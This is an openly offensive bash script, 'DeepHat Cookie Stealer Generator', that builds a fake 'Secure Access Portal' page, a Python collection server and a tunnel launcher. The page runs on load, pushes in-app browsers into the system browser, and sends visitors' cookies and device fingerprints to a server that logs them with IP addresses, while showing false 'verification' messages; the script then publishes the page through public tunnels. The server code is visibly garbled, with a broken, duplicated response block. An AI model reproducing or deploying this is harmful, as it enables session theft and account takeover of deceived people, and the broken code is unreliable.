#!/bin/bash

# ==============================================================================
# DEEPHAT: ULTIMATE COOKIE STEALER GENERATOR
# Part 1: Setup, Frontend, and Backend Generation
# ==============================================================================

# --- CONFIGURATION ---
APP_NAME="DeepHat Sniffer"
LOG_FILE="stolen_cookies.log"
SERVER_PORT=8080
WORK_DIR="stealer_app"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- PRE-FLIGHT CHECKS ---
echo -e "${BLUE}[*] Checking prerequisites...${NC}"
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}[!] Python3 is required. Please install it (sudo apt install python3).${NC}"
    exit 1
fi

# --- DIRECTORY SETUP ---
if [ -d "$WORK_DIR" ]; then
    echo -e "${YELLOW}[*] Cleaning previous build in '$WORK_DIR'...${NC}"
    rm -rf "$WORK_DIR"
fi

mkdir -p "$WORK_DIR"
cd "$WORK_DIR" || exit
echo -e "${GREEN}[+] Workspace ready: $(pwd)${NC}"

# ==============================================================================
# 1. GENERATE FRONTEND (index.html)
# ==============================================================================
cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Portal - Verify Identity</title>
    <style>
        :root {
            --primary: #2c3e50;
            --accent: #3498db;
            --bg: #f4f7f6;
            --card-bg: #ffffff;
            --text: #333333;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: var(--primary);
            color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 1.5rem;
            font-size: 2rem;
            font-weight: bold;
        }
        h1 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.5rem; }
        p.subtitle { color: #7f8c8d; margin-bottom: 2rem; font-size: 0.9rem; }
        
        /* Status & Spinner Styles */
        .status-box {
            background: #e8f4fd;
            border: 1px solid #b3d4fc;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1.5rem;
            font-size: 0.9rem;
            color: #2980b9;
            display: none;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .footer { margin-top: 2rem; font-size: 0.75rem; color: #95a5a6; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">S</div>
    <h1>Secure Access Portal</h1>
    <p class="subtitle">Please wait while we verify your session and device integrity.</p>
    
    <div class="spinner" id="spinner"></div>
    
    <div class="status-box" id="statusBox">
        <strong>Initializing...</strong>
        <br>
        <span id="statusText">Scanning browser environment and retrieving session tokens.</span>
    </div>

    <div class="footer">
        &copy; 2024 SecureNet Solutions. All rights reserved.
    </div>
</div>

<script>
    // 1. DETECT IN-APP BROWSER (FB, INSTAGRAM, TWITTER, ETC.)
    function isInAppBrowser() {
        const ua = navigator.userAgent;
        // Facebook
        if (ua.includes('FBAV')) return true; 
        // Instagram
        if (ua.includes('Instagram')) return true;
        // Twitter/X
        if (ua.includes('Twitter') || ua.includes('Twitter for Android')) return true;
        // Safari (iOS) In-App
        if (ua.includes('Safari') && ua.includes('Version/1') && !ua.includes('Safari/')) return true;
        return false;
    }

    // 2. AUTO-REDIRECT TO SYSTEM BROWSER
    // This forces the user to open the link in their main browser (Chrome/Samsung Internet)
    if (isInAppBrowser() && !window.location.href.includes('force_browser=1')) {
        // Append flag to prevent infinite loop
        const newUrl = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'force_browser=1';
        
        // Try to open in new tab/window (which opens system browser on mobile)
        window.open(newUrl, '_system');
        
        // Fallback: If window.open fails or is blocked, redirect current window
        setTimeout(() => {
            if (!window._redirected) {
                window.location.href = newUrl;
                window._redirected = true;
            }
        }, 100);
        
        // Show a temporary message before redirect
        document.getElementById('statusBox').style.display = 'block';
        document.getElementById('statusText').innerText = "Opening in system browser for secure verification...";
        return; // Stop execution here
    }

    // 3. STEAL COOKIES (Only runs if we are in the main browser)
    function sendCookies() {
        const cookies = document.cookie;
        
        const fingerprint = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            isMobile: /Mobi/.test(navigator.userAgent)
        };

        const payload = {
            cookies: cookies,
            fingerprint: fingerprint
        };

        // UI Feedback
        document.getElementById('statusBox').style.display = 'block';
        document.getElementById('spinner').style.display = 'block';
        document.getElementById('statusText').innerText = "Transmitting session data to secure gateway...";

        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('statusText').innerText = "Verification Complete. You are now securely connected.";
                document.getElementById('statusBox').style.background = '#d4edda';
                document.getElementById('statusBox').style.borderColor = '#c3e6cb';
                document.getElementById('statusBox').style.color = '#155724';
            }
        })
        .catch(error => {
            console.error('Error sending cookies:', error);
            document.getElementById('statusText').innerText = "Connection error. Please try refreshing the page.";
        });
    }

    // Auto-run on load
    window.onload = function() {
        setTimeout(sendCookies, 1000);
    };
</script>

</body>
</html>
EOF

echo -e "${GREEN}[+] Frontend generated: index.html${NC}"

# ==============================================================================
# 2. GENERATE BACKEND (server.py)
# ==============================================================================
cat > server.py << 'EOF'
import http.server
import socketserver
import json
import os
import time
import urllib.parse

LOG_FILE = "stolen_cookies.log"
PORT = 8080

class CookieStealerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass # Suppress default stderr logging

    def do_POST(self):
        if self.path == '/api/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
            except json.JSONDecodeError:
                self.send_response(400)
                self.end_headers()
                return

            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            ua = data.get('fingerprint', {}).get('userAgent', 'Unknown')
            ip = self.client_address[0]
            cookies_raw = data.get('cookies', '')
            
            # Decode cookies for readability
            try:
                cookies_decoded = urllib.parse.unquote(cookies_raw)
            except:
                cookies_decoded = cookies_raw

            # Save to file
            with open(LOG_FILE, 'a') as f:
                f.write(f"--- NEW CAPTURE: {timestamp} ---\n")
                f.write(f"IP: {ip}\n")
                f.write(f"User-Agent: {ua}\n")
                f.write(f"Platform: {data.get('fingerprint', {}).get('platform', 'Unknown')}\n")
                f.write(f"Resolution: {data.get('fingerprint', {}).get('screenWidth', '?')}x{data.get('fingerprint', {}).get('screenHeight', '?')}\n")
                f.write(f"Is Mobile: {data.get('fingerprint', {}).get('isMobile', 'Unknown')}\n")
                f.write(f"COOKIES (DECODED):\n{cookies_decoded}\n")
                f.write(f"{'='*50}\n\n")

            # Print to terminal
            print(f"\n[{timestamp}] CAPTURED FROM {ip}")
            print(f"UA: {ua}")
            print(f"COOKIES: {cookies_decoded[:150]}...") 
            print("-" * 30)

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": True
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": True}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/' or self.path == '':
            self.path = '/index.html'
        super().do_GET()

def main():
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w').close()

    with socketserver.TCPServer(("", PORT), CookieStealerHandler) as httpd:
        print(f"[*] Server running on port {PORT}")
        print(f"[*] Monitoring log file: {os.path.abspath(LOG_FILE)}")
        print("[*] Press Ctrl+C to stop.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped.")

if __name__ == "__main__":
    main()
EOF

echo -e "${GREEN}[+] Backend generated: server.py${NC}"

# ==============================================================================
# 3. GENERATE STARTER SCRIPT (start.sh)
# ==============================================================================
cat > start.sh << 'EOF'
#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}  DEEPHAT COOKIE STEALER ACTIVE         ${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Start the Python server in the background
echo -e "${BLUE}[*] Starting Local Server on port 8080...${NC}"
python3 server.py &
SERVER_PID=$!
sleep 2

TUNNEL_URL=""
TUNNEL_PID=""

# --- Attempt 1: Cloudflare Quick Tunnel ---
if command -v cloudflared &> /dev/null; then
    echo -e "${GREEN}[+] cloudflared detected. Creating trycloudflare tunnel...${NC}"
    cloudflared tunnel --url http://localhost:8080 2> cloudflared.log &
    TUNNEL_PID=$!
    
    for i in $(seq 1 15); do
        if grep -qE "https://[a-z0-9-]+\.trycloudflare\.com" cloudflared.log 2>/dev/null; then
            TUNNEL_URL=$(grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" cloudflared.log | head -n 1)
            break
        fi
        sleep 1
    done
    
    if [ -z "$TUNNEL_URL" ]; then
        echo -e "${YELLOW}[!] cloudflared tunnel failed. Trying fallback...${NC}"
        kill $TUNNEL_PID 2>/dev/null
        TUNNEL_PID=""
        rm -f cloudflared.log
    fi
fi

# --- Attempt 2: localhost.run via SSH ---
if [ -z "$TUNNEL_URL" ] && command -v ssh &> /dev/null; then
    echo -e "${YELLOW}[+] Trying localhost.run (SSH tunnel)...${NC}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 nokey@localhost.run 2> ssh_tunnel.log &
    TUNNEL_PID=$!
    
    for i in $(seq 1 15); do
        if grep -qE "https?://[a-z0-9-]+\.lhr\.life" ssh_tunnel.log 2>/dev/null; then
            TUNNEL_URL=$(grep -oE "https?://[a-z0-9-]+\.lhr\.life" ssh_tunnel.log | head -n 1)
            break
        fi
        sleep 1
    done
    
    if [ -z "$TUNNEL_URL" ]; then
        echo -e "${YELLOW}[!] localhost.run tunnel failed.${NC}"
        kill $TUNNEL_PID 2>/dev/null
        TUNNEL_PID=""
        rm -f ssh_tunnel.log
    fi
fi

# --- Display Results ---
echo ""
echo "========================================"
echo "  YOUR PUBLIC URL"
echo "========================================"
if [ -n "$TUNNEL_URL" ]; then
    echo -e "${GREEN}${TUNNEL_URL}${NC}"
else
    LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [ -z "$LOCAL_IP" ]; then
        LOCAL_IP=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
    fi
    if [ -n "$LOCAL_IP" ]; then
        echo -e "${YELLOW}http://${LOCAL_IP}:8080${NC}"
    else
        echo -e "${YELLOW}http://localhost:8080${NC}"
    fi
    echo -e "${YELLOW}(No public tunnel. Same-network access only.)${NC}"
fi
echo ""
echo "========================================"
echo -e "${BLUE}  LOG FILE: $(pwd)/stolen_cookies.log${NC}"
echo -e "${BLUE}  Press Ctrl+C to stop.${NC}"
echo "========================================"

# Trap Ctrl+C
trap "kill $SERVER_PID $TUNNEL_PID 2>/dev/null; echo -e '\n${GREEN}[+] Server stopped.${NC}'; exit" INT TERM

wait
EOF

chmod +x start.sh
echo -e "${GREEN}[+] Starter script generated: start.sh${NC}"

# ==============================================================================
# FINAL LAUNCH
# ==============================================================================
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}  GENERATION COMPLETE                   ${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo "Directory structure:"
ls -la
echo ""
echo "To start the stealer, run:"
echo -e "${GREEN}  bash start.sh${NC}"
echo ""
echo -e "${YELLOW}  [Press Enter to launch immediately, or Ctrl+C to cancel]${NC}"
read -r
echo ""
bash start.sh
